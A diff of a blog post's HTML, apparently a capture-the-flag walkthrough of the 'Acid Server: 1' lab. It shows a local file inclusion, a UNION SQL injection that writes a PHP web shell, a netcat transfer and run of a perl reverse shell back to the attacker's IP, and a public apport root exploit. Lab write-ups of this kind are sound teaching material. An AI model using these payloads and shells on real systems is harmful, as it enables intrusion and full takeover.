+</span><span class='line'>gICAgICAgICA8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG
+</span><span class='line'>9va3MgbGlrZSB0aGF0IHlvdSBrbm93IHlvdXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0a
+</span><span class='line'>W9uPSI8P3BocCAkX1BIUF9TRUxGID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFj
+</span><span class='line'>ZWhvbGRlcj0iRmlsZSBOYW1lIiB0eXBlPSJ0ZXh0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJ
+</span><span class='line'>hZGQiIHR5cGU9InN1Ym1pdCIgaWQ9ImFkZCIgdmFsdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCg
+</span><span class='line'><span class="nv">oKCgoKCgoKCgoKCgoKCjwhLS0weDU5MzM1NjZhNGM2ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span> <span class="p">|</span> base64 --decode
 </span><span class='line'>&lt;?php
 </span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
 </span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
@@ -447,9 +451,9 @@ There is only one readable file descriptor  /proc/self/fd/14 but I found later a
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Protected page source:</p>
+<p>Lets proceed with examining the source code of the <em>protected_page.php</em> scirpt:</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span>protected_page.php source code </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -493,7 +497,7 @@ There is only one readable file descriptor  /proc/self/fd/14 but I found later a
 <span class='line-number'>42</span>
 <span class='line-number'>43</span>
 <span class='line-number'>44</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=protected_page.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f <span class="m">1</span> <span class="p">|</span> base64 --decode
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=protected_page.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f <span class="m">1</span> <span class="p">|</span> base64 --decode
 </span><span class='line'>&lt;?php
 </span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
 </span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
@@ -540,14 +544,13 @@ There is only one readable file descriptor  /proc/self/fd/14 but I found later a
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Visit:
-<a href="http://192.168.2.102:33447/Challenge/hacked.php">http://192.168.2.102:33447/Challenge/hacked.php</a></p>
+<p>A very interesting php script named <strong>hacked.php</strong> is found in the elseif statement, lets point our browser to it:</p>
 
-<p><img class="center" src="/images/2015/1/image 9.png"></p>
+<p><img class="center" src="/images/2015/1/image 10.png"></p>
 
-<p>source of hacked.php:</p>
+<p>Ok, lets examine its source code to see what is actually happening inside that scirpt:</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span>hacked.php source code </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -666,63 +669,37 @@ There is only one readable file descriptor  /proc/self/fd/14 but I found later a
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>SQL Injection:
-The id parameter which is sent through the HTTP POST method  is the one that is used in the sql query executed by MySql DBMS.</p>
+<p>So, after examining the source code of <em>hacked.php</em>, we can see that the mysql query takes the id parameter which is sent through HTTP POST data , and not the one sent through HTTP GET data, and just select a row that matches that id, then it just prints &ldquo;You are going Good&hellip;Show me your Ninja Skills&rdquo;.</p>
 
-<p>Payload</p>
+<h3>UNION based SQL Injection</h3>
 
-<p>id=&lsquo;)) UNION SELECT 1,&ldquo;&lt;?php system($_GET['cmd&rsquo;]); ?>&rdquo;,3,4,5 INTO OUTFILE &lsquo;/tmp/shell.php&rsquo;&ndash;</p>
+<p>That mysql query is vulnerable to <strong>union based sql injection</strong> and we can use <strong>SELECT .. INTO OUTFILE</strong> to write simple php shell in the /tmp directory to get remote command execution on the target machine.</p>
 
-<p><img class="center" src="/images/2015/1/image 10.png"></p>
+<p>The UNION operator combines the result of the two sql queries and it requires that they have the same number of columns.</p>
 
-<p>or cURL</p>
+<p>By reading the <a href="https://github.com/peredurabefrog/phpSecureLogin/blob/master/secure_login.sql">secure_login.sql</a> file in the github repo of the login script, we can see that there are 5 columns per record in the members table.</p>
 
-<p>curl -s &ndash;cookie &ldquo;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&rdquo; &ndash;data &ldquo;id=&lsquo;)) UNION SELECT &rsquo;&lt;?php system(%24_GET[\&lsquo;cmd\&rsquo;]); ?>&lsquo;,2,3,4,5 INTO OUTFILE &rsquo;/tmp/shell.php'&ndash; -&rdquo; &ldquo;<a href="http://192.168.2.102:33447/Challenge/hacked.php?id=1&amp;add=Add+ID">http://192.168.2.102:33447/Challenge/hacked.php?id=1&amp;add=Add+ID</a>&rdquo;</p>
+<p>The final payload will look like the following:</p>
 
-<p>shell:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;id ;uname -a;pwd;which nc;which perl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
-</span><span class='line'>/var/www/html/Challenge
-</span><span class='line'>/bin/nc
-</span><span class='line'>/usr/bin/perl
-</span><span class='line'>  2   3   4   5
+<figure class='code'><figcaption><span>SQL Injection Payload</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">id</span><span class="o">=</span><span class="s1">&#39;)) UNION SELECT &quot;&lt;?php system($_GET[&#39;</span>cmd<span class="s1">&#39;]); ?&gt;&quot;,2,3,4,5 INTO OUTFILE &#39;</span>/tmp/shell.php<span class="err">&#39;</span>-- -
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Interactive shell:</p>
+<p>Lets fire up cURL again:</p>
 
-<p>I will use <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a> provided by <a href="http://pentestmonkey.net">pentestmonkey.net</a></p>
-
-<p>Wget isn&rsquo;t installed in the Acid so I used netcat to transfer the reverse shell:</p>
-
-<p>On our machine</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nvlp <span class="m">7777</span> &lt; revshell.pl
-</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
+<figure class='code'><figcaption><span>creating php shell in</span><a href='/tmp/shell.php'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl -s --cookie <span class="s2">&quot;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&quot;</span> --data <span class="s2">&quot;id=&#39;)) UNION SELECT &#39;&lt;?php system(%24_GET[\&#39;cmd\&#39;]); ?&gt;&#39;,2,3,4,5 INTO OUTFILE &#39;/tmp/shell.php&#39;-- -&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/hacked.php?id=1&amp;add=Add+ID&quot;</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>On another terminal</p>
+<p>We can simply use the hackbar firefox add-on instead of cURL to execute that payload as well:</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;nc 192.168.2.108 7777 &gt; revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
+<p><img class="center" src="/images/2015/1/image 11.png"></p>
 
+<h3>Remote Command Execution</h3>
 
-<p>Execute the reverse shell:</p>
+<p>By including our shell.php using include.php, we can execute any command under the privileges of the www-data user:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -733,27 +710,63 @@ The id parameter which is sent through the HTTP POST method  is the one that is 
 <span class='line-number'>7</span>
 <span class='line-number'>8</span>
 <span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;perl revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;id ;uname -a;pwd;which nc;which wget;which perl;which python&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
 </span><span class='line'>
-</span><span class='line'>Content-Length: 0
-</span><span class='line'>Connection: close
-</span><span class='line'>Content-Type: text/html
-</span><span class='line'>
-</span><span class='line'>Content-Length: 44
-</span><span class='line'>Connection: close
-</span><span class='line'>Content-Type: text/html
-</span><span class='line'>
-</span><span class='line'>Sent reverse shell to 192.168.2.108:4444&lt;p&gt;
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
+</span><span class='line'>/var/www/html/Challenge
+</span><span class='line'>/bin/nc
+</span><span class='line'>/usr/bin/perl
+</span><span class='line'>/usr/bin/python
 </span><span class='line'>  2   3   4   5
 </span></code></pre></td></tr></table></div></figure>
 
 
+<p>Wonderful!</p>
 
+<p><em>Note that wget isn&rsquo;t available in the target system.</em></p>
+
+<p>It&rsquo;s the time for an interactive shell:</p>
+
+<p>We will use <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a> provided by <a href="http://pentestmonkey.net">pentestmonkey.net</a> after modifying the ip address and port number in the perl script, and we will use <strong>netcat</strong> to transfer the shell because <strong>wget</strong> isn&rsquo;t available in the target system.</p>
+
+<p>Basic modifications in the perl reverse shell:</p>
+
+<figure class='code'><figcaption><span>Modification to the perl-reverse-shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Where to send the reverse shell.  Change these.</span>
+</span><span class='line'>my <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.2.108&#39;</span><span class="p">;</span> <span class="c">#Our kali&#39;s ip address</span>
+</span><span class='line'>my <span class="nv">$port</span> <span class="o">=</span> 4444<span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>lets upload it to Acid server, on our local machine:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nvlp <span class="m">7777</span> &lt; revshell.pl
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And on another terminal:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;nc 192.168.2.108 7777 &gt; revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, after transferring the shell and while listening on port 4444 on our local machine, we execute revshell.pl on the target system using the following command:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;perl revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And we successfully receive our reverse shell:</p>
+
+<figure class='code'><figcaption><span>RCE</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -778,16 +791,84 @@ The id parameter which is sent through the HTTP POST method  is the one that is 
 </span></code></pre></td></tr></table></div></figure>
 
 
-<h2>privilege Escalation</h2>
+<h3>Privilege Escalation and Capturing the Flag</h3>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>nc -nvlp <span class="m">7777</span> &lt; apport
+<p>Lets get the OS version information:</p>
+
+<figure class='code'><figcaption><span>OS Info</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/<span class="nv">$ </span>uname -a
+</span><span class='line'>uname -a
+</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
+</span><span class='line'>www-data@acid:/<span class="nv">$ </span>cat /etc/os-release
+</span><span class='line'>cat /etc/os-release
+</span><span class='line'><span class="nv">NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu&quot;</span>
+</span><span class='line'><span class="nv">VERSION</span><span class="o">=</span><span class="s2">&quot;15.04 (Vivid Vervet)&quot;</span>
+</span><span class='line'><span class="nv">ID</span><span class="o">=</span>ubuntu
+</span><span class='line'><span class="nv">ID_LIKE</span><span class="o">=</span>debian
+</span><span class='line'><span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu 15.04&quot;</span>
+</span><span class='line'><span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">&quot;15.04&quot;</span>
+</span><span class='line'><span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">&quot;http://www.ubuntu.com/&quot;</span>
+</span><span class='line'><span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">&quot;http://help.ubuntu.com/&quot;</span>
+</span><span class='line'><span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">&quot;http://bugs.launchpad.net/ubuntu/&quot;</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
+<p>Acid server is running under Ubuntu version 15.04 which is affected with a local root race condition vulnerability <em>&ldquo;CVE-2015-1325&rdquo;</em>.
+There is a public exploit for this vulnerability: &ldquo;<a href="https://www.exploit-db.com/exploits/37088/">Apport/Ubuntu - Local Root Race Condition</a>&rdquo; which we will use to gain root privileges on Acid server.</p>
 
+<p>Lets compile and transfer the exploit to the target system.</p>
+
+<p>On our local machine:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gcc 37088.c -o apport
+</span><span class='line'>root@kali:~# nc -nvlp <span class="m">7777</span> &lt; apport
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And on Acid server:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/<span class="nv">$ </span><span class="nb">cd</span> /tmp
+</span><span class='line'><span class="nb">cd</span> /tmp
+</span><span class='line'>www-data@acid:/tmp<span class="nv">$ </span>nc -nv 192.168.2.108 <span class="m">7777</span> &gt; apport
+</span><span class='line'>nc -nv 192.168.2.108 <span class="m">7777</span> &gt; apport
+</span><span class='line'>Connection to 192.168.2.108 <span class="m">7777</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/tmp<span class="nv">$ </span>chmod +x apport
+</span><span class='line'>chmod +x apport
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And finally we execute the exploit and escalate our privileges to root:</p>
+
+<p><em>Note: The exploit just hangs on the first attempt, but it has been executed successfully on the second one.</em></p>
+
+<figure class='code'><figcaption><span>root access and capturing the flag</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -892,7 +973,7 @@ The id parameter which is sent through the HTTP POST method  is the one that is 
 </span></code></pre></td></tr></table></div></figure>
 
 
-
+<p>Mission Accomplished.</p>
 </div>
 
 
@@ -908,7 +989,7 @@ The id parameter which is sent through the HTTP POST method  is the one that is 
 
 
 
-<time class='entry-date' datetime='2015-08-22T15:58:42-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>3:58 pm</span></time>
+<time class='entry-date' datetime='2015-08-24T17:16:43-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:16 pm</span></time>
       
 
 
@@ -916,7 +997,7 @@ The id parameter which is sent through the HTTP POST method  is the one that is 
     
       <div class="sharing">
   
-  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://andrewemil.github.io/blog/2015/08/22/acid-server-1-walkthrough/" data-via="" data-counturl="http://andrewemil.github.io/blog/2015/08/22/acid-server-1-walkthrough/" >Tweet</a>
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://andrewemil.github.io/blog/2015/08/24/acid-server-1-walkthrough/" data-via="" data-counturl="http://andrewemil.github.io/blog/2015/08/24/acid-server-1-walkthrough/" >Tweet</a>
   
   
   
@@ -950,7 +1031,7 @@ The id parameter which is sent through the HTTP POST method  is the one that is 
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/2015/08/22/acid-server-1-walkthrough/">Acid Server: 1 Walkthrough</a>
+        <a href="/blog/2015/08/24/acid-server-1-walkthrough/">Acid Server:1 Walkthrough</a>
       </li>
     
   </ul>
@@ -981,8 +1062,8 @@ The id parameter which is sent through the HTTP POST method  is the one that is 
       
         
         // var disqus_developer = 1;
-        var disqus_identifier = 'http://andrewemil.github.io/blog/2015/08/22/acid-server-1-walkthrough/';
-        var disqus_url = 'http://andrewemil.github.io/blog/2015/08/22/acid-server-1-walkthrough/';
+        var disqus_identifier = 'http://andrewemil.github.io/blog/2015/08/24/acid-server-1-walkthrough/';
+        var disqus_url = 'http://andrewemil.github.io/blog/2015/08/24/acid-server-1-walkthrough/';
         var disqus_script = 'embed.js';
       
     (function () {
